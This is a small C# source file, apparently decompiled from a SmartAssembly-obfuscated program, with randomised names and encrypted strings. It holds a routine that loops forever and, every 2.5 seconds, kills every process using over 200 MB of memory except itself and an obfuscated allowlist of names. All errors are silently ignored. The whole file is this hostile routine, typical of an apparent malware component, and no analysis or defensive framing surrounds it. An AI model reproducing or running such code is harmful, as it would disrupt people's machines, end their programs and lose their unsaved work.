using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace KNpKkassJHAdE;

public static class uuPqPNmPaN
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void nmVzaENyjIxo()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107460242)) && !process.ProcessName.Contains(getString_0(107460233)) && !process.ProcessName.Contains(getString_0(107460256)) && !process.ProcessName.Contains(getString_0(107460247)) && !process.ProcessName.Contains(getString_0(107460202)) && !process.ProcessName.Contains(getString_0(107460221)) && !process.ProcessName.Contains(getString_0(107460176)) && !process.ProcessName.Contains(getString_0(107460195)) && !process.ProcessName.Contains(getString_0(107460182)) && !process.ProcessName.Contains(getString_0(107460137)) && !process.ProcessName.Contains(getString_0(107460148)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static uuPqPNmPaN()
	{
		Strings.CreateGetStringDelegate(typeof(uuPqPNmPaN));
	}
}
